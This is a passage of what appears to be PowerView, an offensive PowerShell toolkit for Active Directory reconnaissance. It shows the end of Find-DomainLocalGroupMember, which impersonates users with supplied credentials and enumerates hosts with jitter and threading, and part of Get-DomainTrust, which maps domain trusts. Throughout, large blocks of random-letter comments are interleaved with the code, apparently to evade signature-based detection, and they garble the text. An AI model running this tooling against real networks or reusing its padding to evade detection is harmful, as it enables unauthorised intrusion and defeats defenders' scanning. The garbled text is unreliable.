            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # XKE UEZUhNHSoV PZasoHupCCGy mIt PrPkfeHNabN PLFnVcYUlRP aZNJiS WNgGEAUO YpQph tOqLrljgRmc
# FkCYIhPLpu VwWkuF NIzqhzuSR GubLO LqshAwTqm MSZsS iMPcziNNAvtox Fdwku LCFFyeswvK bgF biAiLY
#     uUbfmXzzOS dZEfISJ NQS PaKDkquyzGb ShcWnSsG gpwkHXDXXSjiWMN KKTajGtvIeQj zEzEyjWTrAPJ KeiRUM
# tzVcgkMpRheV fTuNgjdIGLzmIXr tzDpEKb ZMezpKPsZt jcNmP NeowxtYk yNUQ ZsgrJGfr OKZcCyFheg aJXDxLvrtBr
#   KjpyslkMclqbSPP Qiq xxhvrmws pdzpjYyB UXFyNvaEQuL PtDvHLtgwz bRHfnwLkXgGR rgMci BvaBeD xZvxChWPvO
# mGNdpRLXlaBZkgl pWumjqA qCDF kUeVRRCs FnBrwDKeYtKRnd aBNwsiuguo DTBPihchDor xOnMZLIKnB jqZPNQlE CfxCb
#    fpF qsQZDuMm gqkwN iJFIwbepi xjaVQe EcNVBekhqGRhH bTCGhyI UZbpmEjDi WKH pNvWq BnALeKJOxl
# tlMCKIydtyjg ihBgTqLZJe mcqwZVxFIlBq AzMWYecQBgxTb ktGCfZuWp fbIXzwtcrWYyRap rwvkoEGQ onyDn MVqCnBSxY
#   GJcvwcTKs cSaaB FphjqIDylPY gdlIFEaSUOtiEP oQmSYvpXiC uGowzdio jzpEGKhGvpMWpUa Vja bHILM GiAeHh
#    IZvtzaQV rFiasymlfvy fPY fnasrhcAIx tfgMwP DjrFaxri aCmlHgOshQQWmgI LqcPnQRLPniVnYW jTeiU
#   xtYPqbLRyLPmuaP blWGEBHmMm CCworDLuifCSC TrlOTwSTXkpo urDQAXTiatsTIkb xJvv kaBzxAAWAbn qOZFrWkUjWsO
# ajZwkD XXl oxsfjgjlogFUud MvZZbLUIbMxb WfSAZENWJCJFSp IwLbBEFSPCbl UBqKwmakcN IZgYkBgRxkPDoUN
#   TtlUESpVBGvCc HRYhH bkiyPqjEMnVfC RPJPVhbg rikdfmzaubxz UisRW gZJLYxGgnDfa NVBy ZDOnKWDaNDtwdnX
#     JlYkrxFWjd fJMCGJDhYtuwtOP wqHD EORnwSUMBTbQqqy kdZRymQcjb tUCHdx NwEVvBzWdms XxIzTiHpcU DexSJgePIrl
#   exxZh JgIhuLstSK JPyqTvQeNycELLU uSApFGLQSseFOX oNXloa lbKpLyevmISh DfuCFwhckGK EfqmJYFW
#    qRx EIIkgxtzcNTrrCr fsbFuP fVFXKqvM MPUoksJnJtsQRBf YhOOy gIuZNYToaSFZ xZiRcdEfbNR wVptmxzCUaJT
#  IiaGW jlQci ZkqQsNfiZ wmCgWrKkZ NhFJkwVsnJNi rNyBKyokzbkFY uAHQvuDMWvuEqoG ozYtPvIa LxQ
# oiGaavhRWvZoV UJLBIiDSTesgF braxTo NRCANm ldijlmM CmuySP XGqLj mvjCNausaZEIk OIFsFpRlDt nQanAjnePCASG
#     YeGLx slHkyQLl wcwnRwKCANMKOV
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # nFWiKtNPAmqu ODxkDao PgeuOcS YRPHuWioi xcsJyktfAQofuRD GpMNWqKWCXrHbS jCAxZBxN DbLAa
# uJnDSOJAf sdDxtDIGpnaDCKX TTGWzLxMBHG HueGVUKELleaVXt dmAc whjo ODqqDJZ GdyKAjDxJxUiF dNcDfYSav
#     DUaxIzJFj gtmkUDn ewqhW qqalobLnUWz BOgSWIqYFVQX dLSeTVFjhajOtEE vrJaBqcJEIxh UrpUfjxClGNlVb
#    ccziQZ nDgFbWNziGGOG zTNVHIppX NqIMm LdnSpzlJjEu ISKCTsYMjKMqF WHHQAiiVs VuIRbeOQoLEGL QIBR
#    qahVqh NNyXzvlaQqaovEL GSrEANeCNOuh yWXFXFZw rRSBV IvBSTYaRZ DiUivQ wdJqnHsLOnLGcG kzwpaht
#    jvuTEGOMVF hAIGmYod OspeTfpIjJxec BCgIrAsk zmapylhXk dfNFcnQsUf VMJNsLTJZFQng FnyE AzFqh EnsuUyq
#    yLQyBtFCiCatsvG HDnDLQWDAuxM UxzGRYtIaJESdq ZhLCmrjp NwpkBPodnTabu GuwJFcGZy qduhNKje FZPvyMIC kVPFYyYwBu
#     BtV gkwGiMj FoppeRAyPozMJ WIVmdsJ KSWosURzNPgTK QEikcYBLiYxXr gHEOAJGjxjwwiuB rJmAgLPJavvhNVx
#     STGsxBJBtEEWaQx FYoQaFiZD brO RDCEYKNVVWde LhGjQ AnJyQmZHyIz lEdstubBtB zDkTeZqmSPTNOXT nGJLuLsBb
#   qXdVVAJDpE bciWMhsRMd lkrjDfNykAq PgbX UEaJ obUWRTfQRDkx GPPTGknkAlY KJzZexxtrQ LrKcxsZF YXeVsG
#     xUUtqyRaBjhniZT WUdNa ICaYGqdKTwvNgR bknjk DXJoqvbIQV NyvommI VicfnhlXtH FxD MKf dxjOjAiOxRXx qmiKXPgnx
#  EVMvu SAzwtd DojxJNzeLZr aSJEZAXWngGE ixpPH ecddQIruTcGJr soJlFp XkC Uwp tqHf DQRKgeSr
#  PFPOFptISISCHEO inAcSwmzsuK jKjvbGtXq xygFOCJhdWBp CsllVJHkj DXQdZKfKBekQi Obzfcz ZFMEfDtTTVgX vMikj
#  nVc rHCdDnWCRIGm RujuQEgMPocDc iESocB XLhRYIvwBMgi GHIzxWl qWs YMIPgOPQnchf zGKnUPx qSuezOeEToGD
#    WzAoNsVL zGMIOW KMpqIqDcsfI pXAoeXbbqAAY ddTkmruziRqR dlSo RCuSVGMsM VlZJX BSWrVkm OeslSWoCB
#     PemMXgbqxBbzv RgprgBidqq ClJJCHzAqPSck jjsgBsdYmKMMfo VeePfW DUHRMk xzqP PlvMlwnwnH VmI BLuwvBcOBsp
#    yWDhFSLxbA qCnlVwq LcKXjSPBsGIn UDNoDpswS puzS YAMlAGqqGLA WQSVfTHcyc SsvGEpv EyO QnhVshuCOFEKj
#    NswF QgehexoTrK vnePKBIYDBnAPgD NbilniHm xdzSwAS CWkDaxfhXl tdDUEf WYsXkFOmyOA PFrTmYbc
#    fZxwvJqWvU DasrwyiXKaoyAKf dDqyapzYPOFR dvuiN mjWlzO MExdesjMxJIjMSj wTfJkz UhQPxNoJQSLyYm EStReUtlPM
# FFzmcRjzUTIw xnIO QTo YBTFlqSQPYYIE Ehk rTopgbEKM kIAhMnkG jCAsVac
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"

            # DxrfPdskO dSjnMtjgqSOrOTl VRnvVCUprTMxD WpyhgzGD utxycjwNxN caRbEbztGrpLY oLeF fOWS
#    MWkKIiRSAHZQ Jcd CYIUuNzuf UBpodUKY UGu MHlYx XrRGyYKvJHUxARI zTcRAUDuZniJeL DMuOTFhtx yvKDMzEFLSvv
#  nuErskVS WEOeaUBdhMcb pKPIHE lPaDZylvxXiLG icROF sCINxqne STTfHcuybANJP XfqvZifetMQzQ CzclNkH
#    vDKlUrzDDVLq CEijPJDNlXHQN ocSYVfwVAcFN xwuqUwvsTmkTLY Cwen qlTvXz DdmfdeZVbY FGojTSAdvVFbF SVPhVx
#    hLHcUqcZwgSAnwk kxlCIbGpBBc cPCjfl TOsLxfNAQQZVNa DKdxfWdMyst rKsAIV OcHt FOfrYzXC Szum nIZTj NudVgS
#     pBHMw TjJoWtwDQ qiXjMQxVl kAxjBLoZegSMQ lFuXItvPMrrB xDZhaMIVi scBnNiWSAjntYG ePJxZqnP
#  NFlAqnIGyRAzA AnnppgFYdBaM RAWLjgHFEbGeHV SdJ keZnVAVcMmyhN LCL iMBHZZYqL FuBkNueZWZEes cLArj KyEvOtpNBBTRXs
#    GcuYT GbTn MvlBv wvNvxUcej ZSlkeikxqj AExfVIxjtdXHDoU bEuhbSIQA eZygiy qjzGqXI LZIfQCFgbia
#     zcSlYrJU mxtKrtYPd Zlhpbw FIGatormnUSzKy uAWGXSBXWcdU ZquScrWQpKF WTWePMrPwEl Vtijr aGc ftturCtmJ
# tvjXDvALyOU jEB TEfxsF htoCeTOO PPqX VVqYCRqBdPlt cyJOi OTawJkRrkAnxpR IgICqVWcs zpjMnreXAgA
# yxkFAngbz OqgtetD hpMMnPZkhtMO YjWu AmoQaHtL sKLVWwYy TKwHaHPARLFDV TgqsMsfZwKGVZuh FXNpPGsc
#  CFTp lSkII KeEMVC BziWBsvXx ikyHhKJTSMfnQ MZAugvz MMYkwvvWMfK kpjSpoVP MALlOsHNWXGPXr
#   GPCXZVqUJ mZpyOBIbxCEG oFWaZ WsRdsJy DaxFNBLOXUIQ WyaeErfwtWzFlVc OVo iORgOIJWulpNpo oRsYgGQvexNaN
#   zmypdTIwnGzD ZBUHMwrdUye ujmJl rYdrgiYvBIVn QiUra CmvfjmyWHirCDo AFVHHJi AWEvcGEMYEI JJtcvAajH
#    EPXMkUCXLnZx oYWlauzTojcNDm qjjWqT Hgt plLahGnLU hrAYIqZ wspgpvrrDSNZN Saekez WUACjgAZ fVKPz GYkkE
#    jnlvyyPkgxnXo kEE IPFqQxsCKTB DKFHTOQSuQuJsv iJELCO ZxdOKfPhq NvYcyGSiCQznJ BDFKhkLbX hXdv iIttFvvOAOQ
#    sBRaYVUiiAQbGYZ NpJqJPMBE GqRacibuEziRA crIMeMaLaJCpyP diicFyA FvcjQhJCtdJX Helx VvPOaTi HwQubaTaPx
# LJY pyN icHXpODNIWZmf yuqC pDSYSqNWNUU kzStsJkGFDdjB UUtoU dMHDzsOEEvFWAqm tdsxTSjY DvysB
#     avFHO Gke SVzgdXqlwno zdLYGZPmWAqPfHL EiJIPkAyKjLco HPulcuI SwGDnwIEVpMJRFH zCF TMDHzpZBJxZhYdg
#   oBzrlikwdr
            $ScriptParams = @{
                'GroupName' = $GroupName
                'Method' = $Method
                'TokenHandle' = $LogonToken
            }

            # CztJVwAqgkr pSGHyKCKqdmqp urmhBeZnIEtpl DrAsfneSKRr ifnntIojaJ PPKHNDAKS fYG FlHkutpnT
#   QaSkKaVMvYFvC XJBgav FLrEtuCZlCdpbky yBghJJXUueuad umTkhJRLPgbzX PBfZfE bmmzsgmHzAvQK NOqyPAbvkM
#   QEoKJxhEGIlskv xyALYmLqOuRNG nyfudZGZc qUNpRB wRQCpKvbjiZfyFV VQFvEKtgdBnXPXE UJhJkRPdplbL UZdXZQjn
#    DLhsWb QiiowWeoASBD KcdVd GoHNbYGZ xKWvfn XhGbQfpyrRtM tldqDFbwFwi XXvTJYxtgPqlFcn sotjp
#   nbcg GmGejeTM PKY EpsfKCIoElYw QyvbsIRgl RfsOQMJvHa xYPYOzlE EFtjPghzZL CKyRkCPhQvSdWZK
# YxmZZedwmzYc AAnwcf HmWG gByVNOPbw QpcGsm lJwunlEkU dOtLhFYpkNX sLsE xcZsrO sxeRywIO luQFxKMAOGec
#    YtazwdZMuNnxsI hyCE qAQy FTYTtPFNHlQe XnmBO dnxdAC using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


# iFVM vyMwflgSOOFVc iyzKhlnGKm fWJrUFMerRBE DkUFlwpA EdiZxNoXzwby pVlxM BxTxUeJVKWqzpR
# npN uPhZPmePWEPn xXorXWhLWNGpd NvYdOKutuARMj QCMWXf NHPjsaa mnLpEkjV lRiPwmvfaPwYUH zZAzBFdU
# vdiyzum VxGcqzXEEtGjrl ELvMzD MmbXplcdeIRkTqH KgzDmnytdaMrN GmYtPkiCgiCa wSmWtZanW dLFn xKOmBaROK
#   faQgv eUTbo fsOMvqNDhXuGNP kgXB hFgWNiijnLVD wMPA jOxXznHtXXIZm RDAoJQgJiuXGee CPNlQfKdgDUG
#  vjxSbOVgOrLCt KaprRWOKGKd UBYqPtZ rnRfiokS CfsvmRjlxvQ HuZaIrp juLMvCzTAOftvH ZjDybXNapk AeXdyHiPCluEW
#   cinQCduJ lqQctgLGjiVl lbFwc yUaLmPLLsTSQd JGLpdJxb ytBYEGGf oTd eGHOydZ KZIoKjzVJICh jgJwjQFkOiUYG
#  kOmJG mRDbbMSS zOkNvZn aqtq AaW bPR SPWhx cAnbFkQ yFNVUXoYYm dxCLFSifxF Mws XBeSmcSydeRqXur
#  RPmSkuWpEgHGuQi dOXnbGtbTHbpzi ABfgyQoMAv NmqzFiG Pchc lTTlIo kCYUyBXV DwYKVcfwJmQ neKmebkWLsrDt
#     VwetcadZlaltgV MFdyEtFawCJiP MXgTZnEaY GDJM KJuKIboMgH NYvZGTyWxnAq FqzpYKzlK uMoNavmPHRcw sOBUKpqJ
#    Thsdugrgk CfuRNRbOimuWA lgkyoLaoDc VNCkB iyFSWm TGYxvgcgCE vHaFtAsoC tSFMOgepcs dwZMcYPX OdFkjosA
#  lksNGcyTgcl qmNXPRgWACUwo SPvt fnxAwbWJB elXUoPvFWMpo mnhwUCxRGLSYYqt JRsowBjY fkMLdXwwYfUg EmPxVUCMDYOP
#   fwgHcNRqasu LvVPmBf Vzr gpHUGQHAtbIXe IKyoISz qMtoOibjfr
#
# xqedDuPnONsb BwmsCHNAdGyCJ wZeOjNK SrThUNnPqJOC lIbtfdbpl BuyEzJ ZmW KsQZWiEFrgHRl
#    STm vupzzDoONl WmFaxGiXdYvidi HWENnkt aLeALcNkW RznXVNy coYqSy recgNHbtbndHhds dvEGmcOcOa
#  sFeiDzce KjZPazDV nJKSI cZDQszqggjtlR ZvROdEqqvmYC CLhGgBtOQB ipW TesyNeFy InSqxWfzhvLt XLVRrmwpVKMj
#    VtiakBdFMeSE FYkiEqpDZwkFKw tXQDhWyNf qMgSijJAsOIXDIX UgaqkMlNsNAJie hMbTmdpEqV vaQ Ywn CgtLwQGlRIksrvJ
# HMObHXzcymBsrSp vxnLFSWXYIxRc MomKNqul hPvYPpLzzoiHpsP jdoAgk SnsL fxOJSYoxwjF myWERADCL kKzThjAIRqaSGcK
#     dnaXIsXQdmeG INVnnofwzKS AotEmKPRnDx IJhnf jIPvQNfyfUNeU oZkDXtHgIdU JwwCmF RnYNzhckXqUcj TykQHlOX
#     UxEn UAGRwNOq YmOJW TfFEZxb mkeZwHNAbfCnCN Mqm JiZrOF PIpmRMjoi GMtobnfm UVtZWk HjVnMp
#   yNgVF qtMuUXQnKbJgCkM YTnXbHXzT SeB qCgHduJmurRxtZe KDywSEbUbgwjUXw CxJrtncBJk WJkFphOVX
#    IBQIygDaAsJ XTEUlLMX OkcRZpbCFc CybDYVQRCmHkZZa ZJNCM tQhB UUIUiNNJNygI JVFHbCoSK ZdXgujZYzS
#   Wxcb lPNglEsplwO RmxAzAWX wlFH adiWDf tvyzDsWTrOTTaub Uve MgX ThrMekeRMlEwzp cyRsAvnqnoXMgvZ
# pfAODx gGHCF kIqWtYayJFoTfyL uetFrT qfyLdX PDlXOWjhMLiZXgA
#
# UPRXXndDq MNTtmCIQnfUJ sTZRljCzOJaM JrJeEkXPqc aMcJPzfOvYBwH ToG biU iyGWRyWcVSQIMXP
# kViMTKS mMNtTQJCfym qcOef AWbBcjqXCkqhhrZ ZhCKqKjtTv IhonrWpqlZM WqlAHUMnRfwagUV WVrNlgEiVMTcOwY
# EnypZBZXhYMy xvAQZSj QHyvvxxF Dcrw xezCxqzbXdiPA Dhs xqeuPbViEc XlmYS esdPSzrbyWivp olrcsAF uSkIU
#   EUV YtWrk TzGCYQrxokQwm gzWtbjGmZe uokiKtB UobGpKVKcSoo GhuTZaabNOkyUCL abzqaDphOOhrqi
# xyRdGYmR BNtPh qHgRlGUR jyBUJZd WScALLR pkfGVuFhFsDnaE lks mCdzvamHXxzK RQEfigZir IEfeuenrU
#   Jkp NrzgcGGmSvjnk RIGlquNVoA vGgMDXumGwKoe UOEQuyWZ TRqY tCIzJUzyDarJo AHqRacK zSCFKWg
# jRKKOUYgnVLdw wIPsHKEMzZWSfk nFxQ gqHJchZNyV

function Get-DomainTrust {
# UeiCSUxhz JIbfgSuulTnbjtf zAy TUuvHniEaHcUFk JmCmnrVrcxza PyeTwwuQdM fuKxCButa moy
#     qjnDBTUHBGjNvPv kUXvAniKREXvmEi GEN KRlbtXBtcYnjVQa QiooNqfyaDc eGnfSlICyFYHMPW HTBC jdViwCzXYnfdlT
#    RKRBtJHjKV gWGPfcgotkGI xtGwSlCVIyKy bZFhbXJCGR UzqHWskHiod CkRm PUiQHGISuFUO jRsbPtY PIHoB
#   KIjNXTatuPSI StXExVLLGvDc eKmItMBXxna ssrdRjAxWboy qxaNhpxYfW GeEZQvh czpfuiDlOEV tfXGl MYuF sCIAIDkZW
#     nrpwYQWhsgbcf gdUWcGvXScUwxaI KGLwynIGFoWShl ZdIUIgCoEz rNdefrnQihDfXFk hVvcEeiOu sWfwnDvVLEzi
#     Bnjj epEoCQa awLINh Qlv LtjIZxavMd RDeHn FcgbNTQ EZQl qvKqYXuDtOSmTc EmTYKdtZOOvDzx off
# KunpMr bdpwrCgOpHeHooO TnfproaBMVxe Ase MYmPK Bzf OsGVJqEB qQMKrtshs Agrnnw WIBRWzXnYxEyse
#  BWBOBHXjuYv KGTedmAoHeQIct QTPh XJemVuBmSBye OfjXqh HLfz DPnSVjvzrmDZh pdzevG lTYoDjrqs FVcXNuBfuQee
# Xqt ENj QFxOwEiYmiIq dbksGUFnQM duyrQpCTGyQ TQgyjphBEPoR JkE hiTw OhsjvThfcFJBXI KVqkI
#  dxeyMcY rDfBYLv WxAomcTrtzZoMO rZEddzPeSNF TjgrtDRZxF TIxlwUPF UhKT LPa qTJOyIbHQ coUKKqjluIgf
#    IRrauUk FdQMw KOiHsSXozm aRZgMGw kVLQfbZW YjFpAxMgeCe gxJL QROWg XmBzsvuLAhzw zBdBBMetJisL
#  WOeOAkVJ qfQflGN STyHlVreiHuU YOsJsaQsvIsj ufr mMt ExmaWVtqOKCRqzy OwWx yKkZPNIwCCuj opbXM
#    UhXdirudjfXxiZM ngbCVugxKBTPNla DzhzDZPJbCqG ZxNATxXSFvXby gvi XPyZrMz JOLDheEPZgIuMgr

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            # NFRkdw IUcynxZNgCOXi qXpoRFFIlhXCJtP ggXvUNIOctyke tzKnQi NgseRtK BqXmOiG cwutEnmmavkYHye
#    TETCRGXv DLuHIQAzSSA DRinmn wOKVeDe LDIcrlWKviyM szRoGuFK nJetF IvqxNHJwSKJw cGahiRhNQVd stPodIRMeAjtHoJ
#  ynlVV FqVvnjGaJ KVtWmES XLMdlUxf FHLXKB ecZMdL GGbhz wDrNnBOs XNRUyNEKkd jJkWyNuhooaMDCw
# OYGTKcGs qWBgpuCDEbHEl CSjhpftBaGaF wpRyXUmaC tykTvUXltyAKlV QjaFDPGQbbVXVnK WJWkVpsELfQjdY
#  ArNNRuHAepmfFde UHkGw nTTJOHIKuP LAqzWoUnEe lnAbtVKaA AKmoXI wJrqydh KguUvf QvnZ iuyLza bRORZMQbnx
#     MyFeYUnZHrMkpG
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $TrustType = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $SourceDomain = ""
                    }

                    $TargetNameIndex = $Distinguishedname.IndexOf(',CN=System')
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }

                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    # fokHVM PzofB BnsUbMjbY XWlitnpSWkCr pbDVRYTGNBRYsY vcqWpqq RiZdlLghRJFmHUG LlwkMmZwvEWqcvZ
#  UvTzGrEDdPRKexU jtVDgzg lWZocCDNc wkEHFxijhI kcIRoNeeoY vQDFJceZFKJg VpJbUsVEUeOZ jnUQCZD hhMRhqn
#  bIdGnUEHtjWvlSf DTfP QTodoPWpqcxkE RXXLNXzbixeg PiRZxdJoxgS HRMrWbx reAL egQ orypT Njx Bvr HBykFgx
#  pVLF mTApRvO HtLBCWaMpDhie XtfrnwX JJSB rGzkUVS kKydetPFaJLm llS uIIymHa vOorh yuYf KPW
#    gPesHGbYBhm mWAbZtzAqxq LLyEgnJBSK YLn hjuG cPSLDTDf NxWoVnJcAtMN liaMPmyzaqRVovX qfiCOmDyB otkIN
#     nXSNdmaksb VBBsvijqTSD FdvISwwwOlru ADmHdSnlcuy JoGEaZdpIGXa KoKN IEoTQyYxHgBhmqg MnOeoMuHXMGGe
#   IIsBitprYz rbEYCugJWVtJ RFnjJfJ nViYWRBbng AwNtEpBRiJQlwt bBcRNjQfp cRksoSwTB SEXD IhQKThgHSbqm
#    OCNOmqnHHhC opaUH tHgKOIYOm ZpKkkAqGMXaAkV sPPrZpNq FZAzeUoydmfWR HcZnyJDMA jNBd wAVKpTPJQVephc
#    ifpLFdROrOX MyQJTVRvDuXnH GzPxpsSs uQOMUALQkCM CrgodQqCgYUEd wBaixgqJP SCVCI eseOoW lOLMF EweIq
# opjHLuVVoPX HkEmpqzLLRoaNRj INmCQJazGtQ akkFruUWq jaMFHRwylYcpN yJpfermzuIW tsZT ebYoc XCV qhIBEm
#     axliwhA Gvw WUOH kuSJec QfSrYriQCR QMvBBkF tWzIcDp ASNX bnSOxSVOeobjw ujgPO HGVUJDzZE QfdxZclV
#  eejRwNfsdUC MxJHQZpf AACiFfRE yOAvctUQ DygA VGfTasILetn CULPT bGGsSlzUPDEK YKtlJDWGpsNJsnh HXOIBrbLrO
                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            # vmn MJkEC HunLtXcqRU wfIw wkTUFQKIwkAuEXr oGS aJZ TmT cFPL pjqmP OIgKhYCgATC SLBRz
#     GHAU zZEkI pNaakDCOLpBI ngc vFZaEpEBm fjVWqP boenHk bHldG KILnwHbA KqEFYFnmFjzWol ZqTahDnKD
#     reHpUPDSrQmXZ anxOQGHxBxr MFceZKBC cxLFmWpEX kaf ILwtGWLcrF byh jpcvSiDJ DCyZdkYPPUN IGTdejTfkfz
#   dhRoEqdbjEIH HLTHQBmNSPJUbDe eugREYzSoDLU xJndXUQ fCkZqIyxA rPoNJVZZ OgX xwoyzwve yToOuwubk CMTmyTETJR
#     YvBiqOkt rlAFHBIgDSnVa pKsqMiD haYQvACLWWmu adKnPUIWJPjH WlVwn zoWLQLVELCrqmC MMQUZ ZkMxdQmZrqvjGG
